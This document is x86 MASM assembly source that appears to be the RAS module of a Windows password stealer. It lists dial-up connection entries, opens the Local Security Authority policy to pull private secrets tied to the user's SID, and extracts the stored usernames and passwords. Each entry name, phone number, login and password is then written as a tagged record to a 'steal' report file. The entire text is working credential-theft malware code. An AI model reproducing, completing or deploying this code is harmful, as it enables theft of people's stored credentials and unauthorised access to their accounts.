      RAS_MaxEntryName equ 256
      POLICY_GET_PRIVATE_INFORMATION equ 4

      LSA_OBJECT_ATTRIBUTES struc
           l_Length dd ?
           l_RootDirectory dd ?
           l_ObjectName dd ?
           l_Attributes dd ?
           l_SecurityDescriptor dd ?
           l_SecurityQualityOfService dd ?
      LSA_OBJECT_ATTRIBUTES ends
      
      LSA_UNICODE_STRING struc
           l_Length dw ?
           l_MaximumLength dw ?
           l_Buffer dd ?
      LSA_UNICODE_STRING ends
      
      MYRASENTRYNAME struc
           dwSize dd ?
           szEntryName db 256 + 1 dup (?)
           x1 db 3 dup (?)
           dwFlags dd ?
           szPhonebookPath db 260 + 1 dup (?)
           x2 db 3 dup (?)
      MYRASENTRYNAME ends
      
      MYRASDIALPARAMS struc
           dwSize dd ?
           szEntryName db 256 + 1 dup(?)
           x1 db 1 dup (?)
           szPhoneNumber db 128 + 1 dup(?)
           x2 db 1 dup (?)
           szCallbackNumber db 128 + 1 dup(?)
           x3 db 1 dup (?)
           szUserName db 256 + 1 dup(?)
           szPassword db 256 + 1 dup(?)
           szDomain db 15 + 1 dup(?)
           dwSubEntry dd ?
           dwCallbackId dd ?
      MYRASDIALPARAMS ends
      
      AnsiStrToLsaWideStr PROTO :DWORD, :DWORD

.data?
      align 4
      LsaObjectAttribs LSA_OBJECT_ATTRIBUTES <>
      align 4
      LUS LSA_UNICODE_STRING <>
      align 4
      RasEntry MYRASENTRYNAME <>
      align 4
      RasParams RASDIALPARAMS <>
      align 4
      RasEntryProperties db 6E8h dup (?)
      align 4
      snu dd ?
      LsaBuf db 400h dup (?)
      LsaBufU db 1000h dup (?)
      uname db 100h dup (?)
      sid db 100h dup (?)
      domain db 100h dup (?)
      LocalSid db 400h dup (?)
      ras_path1 db 200h dup (?)
      ras_path2 db 200h dup (?)
      wideNAME db 200h dup (?)
      bookid db 200h dup (?)
      bookpwd db 200h dup (?)
      SBuf db 1000h dup (?)
      lsab db 1000h dup (?)
      cc dd ?
      uidstr db 20h dup (?)
      lsanilstr dd ?
      ras_pwd db 100h dup (?)
     
.code

AnsiStrToLsaWideStr proc pstr:DWORD, pLUS:DWORD
      MultiByteToWideChar, CP_ACP, 0, pstr, -1, addr LsaBufU, sizeof LsaBufU / 2
      lstrlen, pstr
      mov     ecx, dword ptr [pLUS]
      assume  ecx : ptr LSA_UNICODE_STRING
      shl     eax, 1
      mov     [ecx].l_Length, ax
      add     eax, 2
      mov     [ecx].l_MaximumLength, ax
      mov     eax, offset LsaBufU
      mov     [ecx].l_Buffer, eax
      assume  ecx : nothing
      ret
AnsiStrToLsaWideStr endp

AnsiToUTF8 proc uses edi Src, Dst: DWORD
      LOCAL   lpTemp: DWORD
      GlobalAlloc, GPTR, 2048
      mov     lpTemp, eax	      
      MultiByteToWideChar, CP_ACP, 0, Src, -1, lpTemp, 1000
      WideCharToMultiByte, CP_UTF8, 0, lpTemp, -1, Dst, 1000, 0, 0
      GlobalFree, lpTemp
      ret
AnsiToUTF8 endp

GetLocalSid proc
      LOCAL   uSize,SidSize,DomainSize,pSid:DWORD
      mov     eax, 255
      mov     uSize, eax
      mov     SidSize, eax
      mov     DomainSize, eax
      lea     eax, uSize
      push    eax
      push    offset uname
      call    _GetUserName
      push    offset snu
      lea     eax, DomainSize
      push    eax
      push    offset domain
      lea     eax, SidSize
      push    eax
      push    offset sid
      push    offset uname
      push    0
      call    _LookupAccountName;, 0, addr uname, addr sid, addr SidSize, addr domain, addr DomainSize, addr snu
      push    offset sid
      call    _IsValidSid
      test    eax, eax
      je      err_gls
      lea     eax, pSid
      push    eax
      push    offset sid
      call    _ConvertSidToStringSid;, addr sid, addr pSid
      lstrcpy, addr LocalSid, pSid
      GlobalFree, pSid
    err_gls:
      ret
GetLocalSid endp

FreeLSA proc hndl:DWORD
      mov     eax, dword ptr [hndl]
      mov     eax, dword ptr [eax]
      push    eax
      call    _LsaFreeMemory
      ret
FreeLSA endp

GetLsaData proc KeyName:DWORD, OutData:DWORD
      LOCAL   LsaHandle:DWORD
      RtlZeroMemory, addr LsaObjectAttribs, sizeof LsaObjectAttribs
      lea     eax, LsaHandle
      push    eax
      push    POLICY_GET_PRIVATE_INFORMATION
      push    offset LsaObjectAttribs
      push    0
      call    _LsaOpenPolicy;, 0, addr LsaObjectAttribs, POLICY_GET_PRIVATE_INFORMATION, addr LsaHandle
      test    eax, eax
      je      no_fucken_ras_err
              mov     eax, 1
              jmp     fucken_ras_err
    no_fucken_ras_err:
      push    OutData
      push    offset LUS
      push    LsaHandle
      call    _LsaRetrievePrivateData;, LsaHandle, addr LUS, OutData
      test    eax, eax
      je      no_lsa_retr_err
              push    LsaHandle
              call    _LsaClose
              mov     eax, 1
              jmp     fucken_ras_err
    no_lsa_retr_err:
      push    LsaHandle
      call    _LsaClose
      xor     eax, eax
    fucken_ras_err:
      ret
GetLsaData endp

ProcessLSABuffer proc uses ebx ecx pLUS:DWORD 
      LOCAL   spos:DWORD
      xor     eax, eax
      mov     spos, eax
      mov     eax, dword ptr [pLUS]
      mov     eax, dword ptr [eax]
      assume  eax : ptr LSA_UNICODE_STRING
      mov     ebx, [eax].l_Buffer
      movsx   ecx, [eax].l_Length
      assume  eax : nothing
      shr     ecx, 1
      sub     ecx, 1
    getchk_lp:
      push    ecx
      
      xor     eax, eax
      mov     cc, eax
      WideCharToMultiByte, CP_ACP, 0, ebx, 1, addr cc, sizeof cc, 0, 0
      add     ebx, 2
      mov     al, byte ptr [cc]
      .if     al == 0
              inc     spos
              .if     spos == 1
                      lstrcpy, addr bookid, addr SBuf
              .elseif spos == 7
                      lstrcpy, addr bookpwd, addr SBuf
              .endif
              mov     byte ptr [SBuf], 0
      .else
              lstrcat, addr SBuf, addr cc
      .endif
      .if     spos == 9
              ;invoke  lstrlen, addr bookid
              ;push    eax
              ;invoke  lstrlen, addr bookpwd
              ;pop     ecx
              ;.if     ( ( eax != 0 ) && ( ecx != 0 ) )
                      push    ebx
                      mov     ebx, offset lsab
                    lsab_again:
                      mov     eax, dword ptr [ebx]
                      .if     eax != 0
                              add     ebx, 4
                              .if     eax != 0FFFFFFFFh
                                      add     ebx, eax
                              .endif
                              jmp     lsab_again
                      .endif
                      lstrlen, addr bookid
                      inc     eax
                      mov     dword ptr [ebx], eax
                      add     ebx, 4
                      lstrcpy, ebx, addr bookid
                      lstrlen, addr bookid
                      inc     eax
                      add     ebx, eax
                      lstrlen, addr bookpwd
                      .if     eax == 0
                              mov     eax, 0FFFFFFFFh
                      .else
                              inc     eax
                      .endif
                      mov     dword ptr [ebx], eax
                      add     ebx, 4
                      lstrcpy, ebx, addr bookpwd
                      pop     ebx
              ;.endif
              mov     spos, 0
              mov     byte ptr [bookid], 0
              mov     byte ptr [bookpwd], 0
      .endif
      
      pop     ecx
      dec     ecx
      jnz     getchk_lp
      ret
ProcessLSABuffer endp

GetRASPwd   proc
      LOCAL   WTF:DWORD
      LOCAL   pNewLUS:DWORD
      LOCAL   SizeOfRasEntryName:DWORD
      LOCAL   rascount:DWORD
      LOCAL   hRasAccs:DWORD
      LOCAL   RasArraySize:DWORD
      LOCAL   RasGetPassBool:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], RAS_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetRASPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax

      mov     eax, sizeof RasEntry
      mov     SizeOfRasEntryName, eax
      mov     RasEntry.dwSize, eax
      lea     eax, rascount
      push    eax
      lea     eax, SizeOfRasEntryName
      push    eax
      push    offset RasEntry
      push    0
      push    0
      call    _RasEnumEntries;, 0, 0, addr RasEntry, addr SizeOfRasEntryName, addr rascount
      .if     ( eax == ERROR_BUFFER_TOO_SMALL ) || ( eax == 0 )
      .else
              mov     rascount, 0
              jmp     nor_ras_2day
      .endif
      
      mov     eax, rascount
      test    eax, eax
      je      nor_ras_2day
      imul    eax, eax, sizeof RasEntry
      mov     RasArraySize, eax
      VirtualAlloc, 0, RasArraySize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      nor_ras_2day
      mov     hRasAccs, eax
      assume  eax : ptr MYRASENTRYNAME
      mov     [eax].dwSize, sizeof RasEntry
      assume  eax : nothing
      lea     eax, rascount
      push    eax
      lea     eax, RasArraySize
      push    eax
      push    hRasAccs
      push    0
      push    0
      call    _RasEnumEntries;, 0, 0, hRasAccs, addr RasArraySize, addr rascount
      test    eax, eax
      jne     not_this_shit_again
      
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset ras_path1
      push    0
      call    _SHGetSpecialFolderPath
      push    offset ras_path1
      call    _PathAddBackslash
      lstrcat, addr ras_path1, addr pbkstr
      push    0
      push    CSIDL_APPDATA
      push    offset ras_path2
      push    0
      call    _SHGetSpecialFolderPath
      push    offset ras_path2
      call    _PathAddBackslash
      lstrcat, addr ras_path2, addr pbkstr
      
      invoke  GetLocalSid
      lstrcpy, addr LsaBuf, addr LsaKeyName1
      lstrcat, addr LsaBuf, addr LocalSid
      lstrcat, addr LsaBuf, addr LsaEnd
      invoke  AnsiStrToLsaWideStr, addr LsaBuf, addr LUS
      invoke  GetLsaData, addr LUS, addr pNewLUS
      test    eax, eax
      jne     fuckengetlaserr1
      invoke  ProcessLSABuffer, addr pNewLUS
      invoke  FreeLSA, addr pNewLUS
    fuckengetlaserr1:
      invoke  AnsiStrToLsaWideStr, addr LsaKeyName2, addr LUS
      invoke  GetLsaData, addr LUS, addr pNewLUS
      test    eax, eax
      jne     fuckengetlaserr2
      invoke  ProcessLSABuffer, addr pNewLUS
      invoke  FreeLSA, addr pNewLUS
    fuckengetlaserr2:
      
      ; no data in LSA
      lstrlen, addr lsab
      test    eax, eax
      je      not_this_shit_again
      
      mov     ecx, rascount
      mov     ebx, dword ptr [hRasAccs]
    fuck_teh_ras:
      push    ecx
      
      mov     RasParams.dwSize, sizeof MYRASDIALPARAMS
      lstrcpy, addr RasParams.szEntryName, addr [ebx][RASENTRYNAME.szEntryName]	
      mov     RasGetPassBool, 1
      lea     eax, RasGetPassBool
      push    eax
      push    offset RasParams
      push    0
      call    _RasGetEntryDialParams;, 0, addr RasParams, addr RasGetPassBool
      ; we got USERNAME & NAME
      
      invoke  AnsiToUTF8, addr RasParams.szEntryName, addr wideNAME
      
      mov     RasArraySize, sizeof RasEntryProperties
      RtlZeroMemory, addr RasEntryProperties, RasArraySize
      mov     eax, RasArraySize
      mov     dword ptr [RasEntryProperties+00h], eax
      push    0
      push    0
      lea     eax, RasArraySize
      push    eax
      push    offset RasEntryProperties
      lea     eax, [ebx][RASENTRYNAME.szEntryName]
      push    eax
      push    0
      call    _RasGetEntryProperties;, 0,  addr [ebx][RASENTRYNAME.szEntryName], addr RasEntryProperties, addr RasArraySize, 0, 0
      ; we got AREA CODE & NUMBER
      
      GetPrivateProfileString, addr RasParams.szEntryName, addr LsaKeyName3, addr lsanilstr, addr uidstr, sizeof uidstr, addr ras_path1
      lstrlen, addr uidstr
      test    eax, eax
      jne     good_uid
      GetPrivateProfileString, addr wideNAME, addr LsaKeyName3, addr lsanilstr, addr uidstr, sizeof uidstr, addr ras_path1
      lstrlen, addr uidstr
      test    eax, eax
      jne     good_uid
      GetPrivateProfileString, addr RasParams.szEntryName, addr LsaKeyName3, addr lsanilstr, addr uidstr, sizeof uidstr, addr ras_path2
      lstrlen, addr uidstr
      test    eax, eax
      jne     good_uid
      GetPrivateProfileString, addr wideNAME, addr LsaKeyName3, addr lsanilstr, addr uidstr, sizeof uidstr, addr ras_path2
      lstrlen, addr uidstr
      test    eax, eax
      je      uid_err
    good_uid:
      ; find pwd by uid
      push    ebx
      mov     ebx, offset lsab
    lsab_find_next:
      mov     eax, dword ptr [ebx]
      .if     eax == 0
              pop     ebx
              jmp     all_data_found
      .endif
      add     ebx, 4
      lstrcmp, ebx, addr uidstr
      .if     eax == 0
              mov     eax, dword ptr [ebx-4]
              add     ebx, eax
              mov     eax, dword ptr [ebx]
              add     ebx, 4
              .if     eax != 0FFFFFFFFh
                      lstrcpy, addr ras_pwd, ebx
              .else
                      mov     byte ptr [ras_pwd], 0
              .endif
              pop     ebx
              jmp     all_data_found
      .else
              mov     eax, dword ptr [ebx-4]
              add     ebx, eax
              mov     eax, dword ptr [ebx]
              add     ebx, 4
              .if     eax != 0FFFFFFFFh
                      add     ebx, eax
              .endif
      .endif
      jmp     lsab_find_next
      pop     ebx
    all_data_found:
      ; SUCCESS
      lea     eax, RasEntryProperties+10h
      lea     ecx, RasEntryProperties+1Bh
      ;invoke  wsprintf, addr msgshit, addr maskz, addr RasParams.szEntryName, eax, ecx, addr RasParams.szUserName, addr ras_pwd
      
      lstrlen, addr RasParams.szEntryName
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_NAME
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr RasParams.szEntryName, plen, addr SNW, NULL

      lstrlen, addr RasEntryProperties+10h
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_RAS_AREA_CODE
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr RasEntryProperties+10h, plen, addr SNW, NULL
      
      lstrlen, addr RasEntryProperties+1Bh
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_RAS_NUMBER
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr RasEntryProperties+1Bh, plen, addr SNW, NULL
      
      lstrlen, addr RasParams.szUserName
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr RasParams.szUserName, plen, addr SNW, NULL
      
      lstrlen, addr ras_pwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr ras_pwd, plen, addr SNW, NULL
      
      mov     byte ptr [ras_pwd], 0
    uid_err:
      add     ebx, sizeof RasEntry
      pop     ecx
      dec     ecx
      jnz     fuck_teh_ras
      
    not_this_shit_again:
      VirtualFree, hRasAccs, 0, MEM_RELEASE
    nor_ras_2day:
    
    GetRASPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
    
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL     
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetRASPwd   endp
